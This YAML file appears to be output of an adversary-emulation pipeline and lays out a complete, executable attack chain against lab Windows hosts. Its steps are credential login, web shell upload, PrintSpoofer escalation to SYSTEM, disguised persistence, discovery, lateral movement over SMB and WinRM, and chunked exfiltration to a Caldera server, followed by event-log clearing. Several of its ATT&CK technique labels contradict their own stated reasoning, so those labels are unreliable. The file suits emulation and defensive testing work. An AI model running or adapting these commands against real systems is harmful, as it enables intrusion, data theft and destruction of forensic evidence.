metadata:
  source: data/processed/step2_concrete_flow.yml
  step: 3
  description: Concrete attack flow with final technique selection
concrete_flow:
  nodes:
  - id: node_001
    name: Web Application Login
    tactic: initial-access
    description: Authenticate to web application using compromised credentials
    environment_specific:
      target: 192.168.56.105
      url: http://192.168.56.105/login_process.asp
      method: POST
      params:
      - userid
      - password
      credentials:
        username: admin
        password: P@ssw0rd!2020
      commands: $body = @{userid='admin'; password='P@ssw0rd!2020'}; $session = New-Object
        Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp'
        -Method POST -Body $body -WebSession $session -UseBasicParsing
    technique:
      id: T1133
      name: External Remote Services
      selection_reason: The attack step demonstrates authentication to a web application
        using valid compromised credentials (admin/P@ssw0rd!2020), which aligns with
        External Remote Services where adversaries leverage legitimate credentials
        to access externally-facing services.
  - id: node_002
    name: Upload Web Shell
    tactic: initial-access
    description: Upload cmd.asp web shell through file upload vulnerability
    environment_specific:
      target: 192.168.56.105
      url: http://192.168.56.105/upload_handler.asp
      method: POST
      content_type: multipart/form-data
      form_field: file
      payload: cmd.asp
      upload_path: /uploads/
      credentials:
        username: admin
        password: P@ssw0rd!2020
      commands: '$loginBody = @{userid=''admin''; password=''P@ssw0rd!2020''}; $session
        = New-Object Microsoft.PowerShell.Commands.WebRequestSession; Invoke-WebRequest
        -Uri ''http://192.168.56.105/login_process.asp'' -Method POST -Body $loginBody
        -WebSession $session -UseBasicParsing; $boundary = [System.Guid]::NewGuid().ToString();
        $filePath = ''cmd.asp''; $fileContent = Get-Content $filePath -Raw; $bodyLines
        = @("--$boundary", ''Content-Disposition: form-data; name="file"; filename="cmd.asp"'',
        ''Content-Type: application/octet-stream'', '''', $fileContent, "--$boundary--");
        $body = $bodyLines -join "`r`n"; Invoke-WebRequest -Uri ''http://192.168.56.105/upload_handler.asp''
        -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body
        $body -WebSession $session -UseBasicParsing'
    technique:
      id: T1133
      name: External Remote Services
      selection_reason: 'The attack step directly uploads a web shell (cmd.asp) through
        a file upload vulnerability, which precisely matches MITRE ATT&CK technique
        T1505.003 (Server Software Component: Web Shell).'
  - id: node_003
    name: Verify Web Shell Access
    tactic: initial-access
    description: Confirm web shell is accessible and functional
    environment_specific:
      target: 192.168.56.105
      url: http://192.168.56.105/uploads/cmd.asp
      method: GET
      commands: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp' -UseBasicParsing
    technique:
      id: T1133
      name: External Remote Services
      selection_reason: The attacker is verifying access to a web shell (cmd.asp)
        which serves as an external remote service for persistent access to the compromised
        web server.
  - id: node_004
    name: Copy PrintSpoofer to Web Directory
    tactic: privilege-escalation
    description: Copy PrintSpoofer64.exe to web-accessible directory
    environment_specific:
      payload: PrintSpoofer64.exe
      destination: C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
      commands: Copy-Item -Path 'PrintSpoofer64.exe' -Destination 'C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe'
        -Force
    technique:
      id: T1100
      name: Web Shell
      selection_reason: The attack step copies an executable (PrintSpoofer64.exe)
        to a web-accessible directory (C:\inetpub\wwwroot\uploads\), which is the
        characteristic behavior of deploying a web shell or malicious file through
        a web server.
  - id: node_005
    name: Copy vcruntime140.dll to Web Directory
    tactic: privilege-escalation
    description: Copy required DLL dependency to web-accessible directory
    environment_specific:
      payload: vcruntime140.dll
      destination: C:\inetpub\wwwroot\uploads\vcruntime140.dll
      commands: Copy-Item -Path 'vcruntime140.dll' -Destination 'C:\inetpub\wwwroot\uploads\vcruntime140.dll'
        -Force
    technique:
      id: T1038
      name: DLL Search Order Hijacking
      selection_reason: The attack step involves placing a DLL (vcruntime140.dll)
        in a web-accessible directory where it can be loaded by malicious code, which
        aligns with DLL Search Order Hijacking technique where attackers place malicious
        DLLs in locations where applications will load them.
  - id: node_006
    name: Copy Deploy Script to Web Directory
    tactic: privilege-escalation
    description: Copy deploy.ps1 Caldera agent deployment script to web-accessible
      directory
    environment_specific:
      payload: deploy.ps1
      destination: C:\inetpub\wwwroot\uploads\deploy.ps1
      commands: Copy-Item -Path 'deploy.ps1' -Destination 'C:\inetpub\wwwroot\uploads\deploy.ps1'
        -Force
    technique:
      id: T1100
      name: Web Shell
      selection_reason: The attack step copies a deployment script to a web-accessible
        directory (C:\inetpub\wwwroot\uploads\), which aligns with establishing web
        shell access for remote code execution through a web server.
  - id: node_007
    name: Execute PrintSpoofer Privilege Escalation
    tactic: privilege-escalation
    description: Use PrintSpoofer to escalate from IIS service account to SYSTEM and
      deploy Caldera agent
    environment_specific:
      target: 192.168.56.105
      url: http://192.168.56.105/uploads/cmd.asp
      exploit: PrintSpoofer64.exe
      required_privilege: SeImpersonatePrivilege
      commands: Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
        -c "powershell.exe -ExecutionPolicy Bypass -File C:\inetpub\wwwroot\uploads\deploy.ps1"'
        -UseBasicParsing
    technique:
      id: T1068
      name: Exploitation for Privilege Escalation
      selection_reason: 'High confidence (score: 11 vs 5)'
  - id: node_008
    name: Create Scheduled Task for Persistence
    tactic: persistence
    description: Register malware in task scheduler for persistence across reboots
    environment_specific:
      task_name: WindowsUpdate
      trigger: ONSTART
      commands: schtasks /create /tn 'WindowsUpdate' /tr 'powershell.exe -ExecutionPolicy
        Bypass -File C:\Windows\Temp\deploy.ps1' /sc onstart /ru SYSTEM /f
    technique:
      id: T1053.005
      name: Scheduled Task
      selection_reason: The attack explicitly uses schtasks to create a scheduled
        task on Windows for persistence, which directly matches the Scheduled Task
        sub-technique definition.
  - id: node_009
    name: Create Service for Persistence
    tactic: persistence
    description: Register malware as system service for persistence
    environment_specific:
      service_name: WinDefender
      binary_path: C:\Windows\Temp\agent.exe
      commands: sc.exe create WinDefender binPath= 'C:\Windows\Temp\agent.exe' start=
        auto; sc.exe start WinDefender
    technique:
      id: T1543.003
      name: Windows Service
      selection_reason: The attack uses sc.exe to create and start a Windows service
        for persistence, which directly matches the Windows Service technique definition.
  - id: node_010
    name: Clear Security Event Logs
    tactic: defense-evasion
    description: Delete security event logs to remove traces of attack
    environment_specific:
      log_name: Security
      commands: wevtutil cl Security
    technique:
      id: T1070.001
      name: Clear Windows Event Logs
      selection_reason: 'High confidence (score: 14 vs 9)'
  - id: node_011
    name: Clear System Event Logs
    tactic: defense-evasion
    description: Delete system event logs to remove traces of attack
    environment_specific:
      log_name: System
      commands: wevtutil cl System
    technique:
      id: T1070.001
      name: Clear Windows Event Logs
      selection_reason: The command 'wevtutil cl System' is a Windows-specific utility
        that directly clears Windows Event Logs, which precisely matches the T1070.001
        technique definition.
  - id: node_012
    name: Clear Application Event Logs
    tactic: defense-evasion
    description: Delete application event logs to remove traces of attack
    environment_specific:
      log_name: Application
      commands: wevtutil cl Application
    technique:
      id: T1070.001
      name: Clear Windows Event Logs
      selection_reason: 'High confidence (score: 14 vs 9)'
  - id: node_013
    name: Delete Uploaded Malware Files
    tactic: defense-evasion
    description: Remove malware files from uploads directory
    environment_specific:
      files:
      - C:\inetpub\wwwroot\uploads\cmd.asp
      - C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe
      - C:\inetpub\wwwroot\uploads\vcruntime140.dll
      - C:\inetpub\wwwroot\uploads\deploy.ps1
      commands: Remove-Item -Path 'C:\inetpub\wwwroot\uploads\cmd.asp','C:\inetpub\wwwroot\uploads\PrintSpoofer64.exe','C:\inetpub\wwwroot\uploads\vcruntime140.dll','C:\inetpub\wwwroot\uploads\deploy.ps1'
        -Force -ErrorAction SilentlyContinue
    technique:
      id: T1070.010
      name: Relocate Malware
      selection_reason: The attack step explicitly removes malware files (cmd.asp,
        PrintSpoofer64.exe, etc.) from the uploads directory using Remove-Item, which
        directly matches the Relocate Malware technique's definition of moving or
        deleting malware to evade detection.
  - id: node_014
    name: Deploy Keylogger (Simulated)
    tactic: credential-access
    description: Simulate keylogger deployment for credential harvesting
    environment_specific:
      output_file: C:\Windows\Temp\perfcon.dat
      simulation: true
      commands: echo 'keylogger stub - capturing keystrokes' > C:\Windows\Temp\perfcon.dat;
        Write-Output 'Keylogger installed (simulated)'
    technique:
      id: T1056.001
      name: Keylogging
      selection_reason: The attack step explicitly simulates keylogger deployment
        for credential harvesting, which directly matches the Keylogging technique
        definition regardless of it being a simulation.
  - id: node_015
    name: Gather System Information
    tactic: discovery
    description: Collect OS version, hostname, and system configuration
    environment_specific:
      output_file: C:\Windows\Temp\sysinfo.txt
      commands: systeminfo > C:\Windows\Temp\sysinfo.txt
    technique:
      id: T1082
      name: System Information Discovery
      selection_reason: 'High confidence (score: 10 vs 6)'
  - id: node_016
    name: Identify Current User Context
    tactic: discovery
    description: Determine current user privileges and context
    environment_specific:
      output_file: C:\Windows\Temp\whoami.txt
      commands: whoami /all > C:\Windows\Temp\whoami.txt
    technique:
      id: T1497.002
      name: User Activity Based Checks
      selection_reason: 'High confidence (score: 5 vs 3)'
  - id: node_017
    name: Enumerate Local User Accounts
    tactic: discovery
    description: Discover local user accounts on compromised system
    environment_specific:
      output_file: C:\Windows\Temp\localusers.txt
      commands: net user > C:\Windows\Temp\localusers.txt
    technique:
      id: T1087.001
      name: Local Account
      selection_reason: 'The command ''net user'' directly enumerates local user accounts
        on the system, which precisely matches the T1087.001 (Account Discovery: Local
        Account) technique definition.'
  - id: node_018
    name: Enumerate Domain Accounts
    tactic: discovery
    description: Discover domain user accounts
    environment_specific:
      output_file: C:\Windows\Temp\domainusers.txt
      commands: net user /domain > C:\Windows\Temp\domainusers.txt 2>&1
    technique:
      id: T1087.002
      name: Domain Account
      selection_reason: 'High confidence (score: 6 vs 4)'
  - id: node_019
    name: Enumerate Running Processes
    tactic: discovery
    description: Identify active processes including security tools
    environment_specific:
      output_file: C:\Windows\Temp\processes.txt
      commands: tasklist /v > C:\Windows\Temp\processes.txt
    technique:
      id: T1007
      name: System Service Discovery
      selection_reason: The tasklist command directly enumerates running processes
        and services on the system, which precisely matches the System Service Discovery
        technique's focus on identifying active processes including security tools.
  - id: node_020
    name: Enumerate System Services
    tactic: discovery
    description: Query running services for exploitation targets
    environment_specific:
      output_file: C:\Windows\Temp\services.txt
      commands: sc query > C:\Windows\Temp\services.txt
    technique:
      id: T1497.001
      name: System Checks
      selection_reason: The command 'sc query' directly enumerates system services,
        which matches T1007 (System Service Discovery) - none of the provided candidates
        are appropriate as they cover virtualization checks, user discovery, and network
        connections rather than service enumeration.
  - id: node_021
    name: Search Critical System Files
    tactic: discovery
    description: Locate system files and DLLs to assess patch levels
    environment_specific:
      search_paths:
      - C:\Windows\System32
      - C:\Windows\SysWOW64
      output_file: C:\Windows\Temp\systemfiles.txt
      commands: Get-ChildItem -Path 'C:\Windows\System32','C:\Windows\SysWOW64' -Filter
        *.dll -Recurse -ErrorAction SilentlyContinue | Select-Object FullName,LastWriteTime
        > C:\Windows\Temp\systemfiles.txt
    technique:
      id: T1033
      name: System Owner/User Discovery
      selection_reason: The attack step involves enumerating system files and DLLs
        to gather information about the system's configuration and patch levels, which
        aligns with System Information Discovery rather than the provided candidates
        focused on user discovery, system checks, or service discovery.
  - id: node_022
    name: Enumerate Network Configuration
    tactic: discovery
    description: Map network settings and interfaces
    environment_specific:
      output_file: C:\Windows\Temp\ipconfig.txt
      commands: ipconfig /all > C:\Windows\Temp\ipconfig.txt
    technique:
      id: T1016
      name: System Network Configuration Discovery
      selection_reason: 'High confidence (score: 9 vs 6)'
  - id: node_023
    name: Enumerate ARP Table
    tactic: discovery
    description: Discover network hosts via ARP cache
    environment_specific:
      output_file: C:\Windows\Temp\arp.txt
      commands: arp -a > C:\Windows\Temp\arp.txt
    technique:
      id: T1018
      name: Remote System Discovery
      selection_reason: The ARP cache enumeration directly discovers other systems
        on the local network, which is the core purpose of Remote System Discovery.
  - id: node_024
    name: Enumerate Routing Table
    tactic: discovery
    description: Map network routing configuration
    environment_specific:
      output_file: C:\Windows\Temp\route.txt
      commands: route print > C:\Windows\Temp\route.txt
    technique:
      id: T1040
      name: Network Sniffing
      selection_reason: The command 'route print' directly enumerates network routing
        tables to discover system network configuration, which is the core definition
        of T1016 System Network Configuration Discovery, not any of the provided candidates.
  - id: node_025
    name: Monitor Active Network Connections
    tactic: discovery
    description: Identify established connections and listening ports
    environment_specific:
      output_file: C:\Windows\Temp\netstat.txt
      commands: netstat -ano > C:\Windows\Temp\netstat.txt
    technique:
      id: T1049
      name: System Network Connections Discovery
      selection_reason: 'High confidence (score: 8 vs 5)'
  - id: node_026
    name: Enumerate Active Sessions
    tactic: discovery
    description: Identify logged-in users and active sessions
    environment_specific:
      output_file: C:\Windows\Temp\sessions.txt
      commands: qwinsta > C:\Windows\Temp\sessions.txt
    technique:
      id: T1033
      name: System Owner/User Discovery
      selection_reason: The qwinsta command directly enumerates logged-in users and
        active sessions on the system, which precisely matches the System Owner/User
        Discovery technique's purpose of identifying users currently using the system.
  - id: node_027
    name: Discover Network Shares
    tactic: discovery
    description: Enumerate network shares and remote systems
    environment_specific:
      output_file: C:\Windows\Temp\netview.txt
      commands: net view > C:\Windows\Temp\netview.txt
    technique:
      id: T1135
      name: Network Share Discovery
      selection_reason: The 'net view' command is specifically used to enumerate network
        shares and remote systems, which directly matches the Network Share Discovery
        technique definition.
  - id: node_028
    name: Enumerate Domain Controllers
    tactic: discovery
    description: Identify domain controllers in network
    environment_specific:
      output_file: C:\Windows\Temp\dclist.txt
      commands: 'nltest /dclist: > C:\Windows\Temp\dclist.txt 2>&1'
    technique:
      id: T1482
      name: Domain Trust Discovery
      selection_reason: The nltest /dclist command directly enumerates domain controllers
        and domain trust relationships, which is the primary purpose of T1482 Domain
        Trust Discovery.
  - id: node_029
    name: Test SMB Access to Internal Host
    tactic: lateral-movement
    description: Verify SMB connectivity to internal network target
    environment_specific:
      target: 192.168.56.106
      share: C$
      credentials:
        username: admin
        password: P@ssw0rd!2020
      commands: net use \\192.168.56.106\C$ /user:admin P@ssw0rd!2020
    technique:
      id: T1550.001
      name: Application Access Token
      selection_reason: The attack step uses explicit credential authentication (username/password)
        to access an SMB share, which aligns with Pass the Hash technique's use of
        alternative authentication material, though the provided candidates don't
        include the more precise T1021.002 (SMB/Windows Admin Shares).
  - id: node_030
    name: Copy Caldera Agent to Internal Host
    tactic: lateral-movement
    description: Deploy Caldera agent to internal system via SMB
    environment_specific:
      target: 192.168.56.106
      share: C$
      source: C:\Windows\Temp\deploy.ps1
      destination: \\192.168.56.106\C$\Windows\Temp\deploy.ps1
      commands: Copy-Item -Path 'C:\Windows\Temp\deploy.ps1' -Destination '\\192.168.56.106\C$\Windows\Temp\deploy.ps1'
        -Force
    technique:
      id: T1534
      name: Internal Spearphishing
      selection_reason: The attack uses SMB administrative share (C$) to copy files
        to a remote system, which directly matches the SMB/Windows Admin Shares technique
        for lateral movement.
  - id: node_031
    name: Execute Remote Agent Deployment
    tactic: lateral-movement
    description: Execute Caldera agent on internal host via remote PowerShell
    environment_specific:
      target: 192.168.56.106
      credentials:
        username: admin
        password: P@ssw0rd!2020
      commands: $password = ConvertTo-SecureString 'P@ssw0rd!2020' -AsPlainText -Force;
        $cred = New-Object System.Management.Automation.PSCredential('admin', $password);
        Invoke-Command -ComputerName 192.168.56.106 -Credential $cred -ScriptBlock
        {powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\deploy.ps1}
    technique:
      id: T1021
      name: Remote Services
      selection_reason: The attack uses Invoke-Command with PowerShell Remoting (WinRM)
        to execute commands on a remote host with credentials, which directly matches
        the Remote Services technique for lateral movement.
  - id: node_032
    name: Collect IIS Web Logs
    tactic: collection
    description: Gather web server logs for analysis
    environment_specific:
      source_path: C:\inetpub\logs\LogFiles
      destination: C:\Windows\Temp\exfil\weblogs
      commands: New-Item -Path 'C:\Windows\Temp\exfil\weblogs' -ItemType Directory
        -Force; Copy-Item -Path 'C:\inetpub\logs\LogFiles\*' -Destination 'C:\Windows\Temp\exfil\weblogs'
        -Recurse -Force
    technique:
      id: T1056.003
      name: Web Portal Capture
      selection_reason: 'High confidence (score: 5 vs 2)'
  - id: node_033
    name: Collect Corporate Documents
    tactic: collection
    description: Search and collect sensitive corporate documents
    environment_specific:
      search_paths:
      - C:\Users
      - C:\inetpub\wwwroot
      file_extensions:
      - '*.docx'
      - '*.xlsx'
      - '*.pdf'
      destination: C:\Windows\Temp\exfil\docs
      commands: New-Item -Path 'C:\Windows\Temp\exfil\docs' -ItemType Directory -Force;
        Get-ChildItem -Path 'C:\Users','C:\inetpub\wwwroot' -Include *.docx,*.xlsx,*.pdf
        -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination 'C:\Windows\Temp\exfil\docs'
        -Force
    technique:
      id: T1602
      name: Data from Configuration Repository
      selection_reason: The attack step collects local data (documents) from the compromised
        system's file system, which directly matches T1005 (Data from Local System)
        rather than configuration repositories, removable media, or email.
  - id: node_034
    name: Capture Active Window Titles (Simulated)
    tactic: collection
    description: Monitor open application windows through simulated keylogger
    environment_specific:
      output_file: C:\Windows\Temp\exfil\windows.txt
      simulation: true
      commands: New-Item -Path 'C:\Windows\Temp\exfil' -ItemType Directory -Force;
        Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object MainWindowTitle,ProcessName
        > C:\Windows\Temp\exfil\windows.txt
    technique:
      id: T1113
      name: Screen Capture
      selection_reason: The attack captures window titles and process information
        from active applications, which is a form of screen/display monitoring that
        falls under Screen Capture technique, whereas T1123 and T1125 specifically
        target audio and video capture respectively.
  - id: node_035
    name: Stage Discovery Results
    tactic: collection
    description: Consolidate all discovery command outputs for exfiltration
    environment_specific:
      source_files:
      - C:\Windows\Temp\sysinfo.txt
      - C:\Windows\Temp\whoami.txt
      - C:\Windows\Temp\localusers.txt
      - C:\Windows\Temp\domainusers.txt
      - C:\Windows\Temp\processes.txt
      - C:\Windows\Temp\services.txt
      - C:\Windows\Temp\systemfiles.txt
      - C:\Windows\Temp\ipconfig.txt
      - C:\Windows\Temp\arp.txt
      - C:\Windows\Temp\route.txt
      - C:\Windows\Temp\netstat.txt
      - C:\Windows\Temp\sessions.txt
      - C:\Windows\Temp\netview.txt
      - C:\Windows\Temp\dclist.txt
      destination: C:\Windows\Temp\exfil\discovery
      commands: New-Item -Path 'C:\Windows\Temp\exfil\discovery' -ItemType Directory
        -Force; Copy-Item -Path 'C:\Windows\Temp\*.txt' -Destination 'C:\Windows\Temp\exfil\discovery'
        -Force -ErrorAction SilentlyContinue
    technique:
      id: T1119
      name: Automated Collection
      selection_reason: The attack step demonstrates automated collection of multiple
        discovery command outputs from a staging location into a consolidated directory
        for exfiltration, which directly matches the Automated Collection technique
        definition.
  - id: node_036
    name: Compress Collected Data
    tactic: exfiltration
    description: Compress staged data using PowerShell built-in compression
    environment_specific:
      source_path: C:\Windows\Temp\exfil
      destination: C:\Windows\Temp\data.zip
      tool: PowerShell Compress-Archive
      commands: Compress-Archive -Path 'C:\Windows\Temp\exfil\*' -DestinationPath
        'C:\Windows\Temp\data.zip' -Force
    technique:
      id: T1002
      name: Data Compressed
      selection_reason: 'High confidence (score: 7 vs 4)'
  - id: node_037
    name: Split Archive into Chunks
    tactic: exfiltration
    description: Split compressed data into 90KB chunks to evade detection
    environment_specific:
      source_file: C:\Windows\Temp\data.zip
      chunk_size: 92160
      output_pattern: C:\Windows\Temp\data_chunk_
      commands: $file = 'C:\Windows\Temp\data.zip'; $chunkSize = 92160; $buffer =
        New-Object byte[] $chunkSize; $reader = [System.IO.File]::OpenRead($file);
        $chunkNum = 0; while (($bytesRead = $reader.Read($buffer, 0, $chunkSize))
        -gt 0) { $chunkFile = "C:\Windows\Temp\data_chunk_$chunkNum"; [System.IO.File]::WriteAllBytes($chunkFile,
        $buffer[0..($bytesRead-1)]); $chunkNum++ }; $reader.Close()
    technique:
      id: T1030
      name: Data Transfer Size Limits
      selection_reason: The attack step explicitly splits data into small 90KB chunks
        to evade detection, which directly matches T1030 Data Transfer Size Limits
        - a technique where adversaries split data into smaller sizes to avoid detection
        thresholds.
  - id: node_038
    name: Exfiltrate Data to Caldera Server
    tactic: exfiltration
    description: Upload collected data chunks to Caldera server
    environment_specific:
      target: 192.168.56.1:8888
      url: http://192.168.56.1:8888/file/upload
      method: POST
      source_pattern: C:\Windows\Temp\data_chunk_*
      commands: Get-ChildItem -Path 'C:\Windows\Temp\data_chunk_*' | ForEach-Object
        { Invoke-RestMethod -Uri 'http://192.168.56.1:8888/file/upload' -Method POST
        -InFile $_.FullName }
    technique:
      id: T1537
      name: Transfer Data to Cloud Account
      selection_reason: The attack step uses HTTP POST to upload data files to a remote
        server (Caldera C2), which aligns with T1537's definition of transferring
        data to cloud/web-based storage accounts for exfiltration.
  edges:
  - from: node_001
    to: node_002
    dependency_type: required
  - from: node_002
    to: node_003
    dependency_type: required
  - from: node_003
    to: node_004
    dependency_type: required
  - from: node_003
    to: node_005
    dependency_type: required
  - from: node_003
    to: node_006
    dependency_type: required
  - from: node_004
    to: node_007
    dependency_type: required
  - from: node_005
    to: node_007
    dependency_type: required
  - from: node_006
    to: node_007
    dependency_type: required
  - from: node_007
    to: node_008
    dependency_type: required
  - from: node_007
    to: node_009
    dependency_type: required
  - from: node_007
    to: node_014
    dependency_type: required
  - from: node_007
    to: node_015
    dependency_type: required
  - from: node_015
    to: node_016
    dependency_type: required
  - from: node_016
    to: node_017
    dependency_type: required
  - from: node_017
    to: node_018
    dependency_type: required
  - from: node_016
    to: node_019
    dependency_type: required
  - from: node_019
    to: node_020
    dependency_type: required
  - from: node_020
    to: node_021
    dependency_type: required
  - from: node_016
    to: node_022
    dependency_type: required
  - from: node_022
    to: node_023
    dependency_type: required
  - from: node_023
    to: node_024
    dependency_type: required
  - from: node_022
    to: node_025
    dependency_type: required
  - from: node_025
    to: node_026
    dependency_type: required
  - from: node_023
    to: node_027
    dependency_type: required
  - from: node_027
    to: node_028
    dependency_type: required
  - from: node_028
    to: node_029
    dependency_type: required
  - from: node_029
    to: node_030
    dependency_type: required
  - from: node_030
    to: node_031
    dependency_type: required
  - from: node_007
    to: node_032
    dependency_type: required
  - from: node_032
    to: node_033
    dependency_type: required
  - from: node_014
    to: node_034
    dependency_type: required
  - from: node_021
    to: node_035
    dependency_type: required
  - from: node_026
    to: node_035
    dependency_type: required
  - from: node_028
    to: node_035
    dependency_type: required
  - from: node_033
    to: node_035
    dependency_type: required
  - from: node_034
    to: node_035
    dependency_type: required
  - from: node_035
    to: node_036
    dependency_type: required
  - from: node_036
    to: node_037
    dependency_type: required
  - from: node_037
    to: node_038
    dependency_type: required
  - from: node_031
    to: node_010
    dependency_type: required
  - from: node_038
    to: node_010
    dependency_type: required
  - from: node_010
    to: node_011
    dependency_type: required
  - from: node_011
    to: node_012
    dependency_type: required
  - from: node_012
    to: node_013
    dependency_type: required
  execution_order:
  - node_001
  - node_002
  - node_003
  - node_004
  - node_005
  - node_006
  - node_007
  - node_008
  - node_009
  - node_014
  - node_015
  - node_016
  - node_017
  - node_018
  - node_019
  - node_020
  - node_021
  - node_022
  - node_023
  - node_024
  - node_025
  - node_026
  - node_027
  - node_028
  - node_029
  - node_030
  - node_031
  - node_032
  - node_033
  - node_034
  - node_035
  - node_036
  - node_037
  - node_038
  - node_010
  - node_011
  - node_012
  - node_013
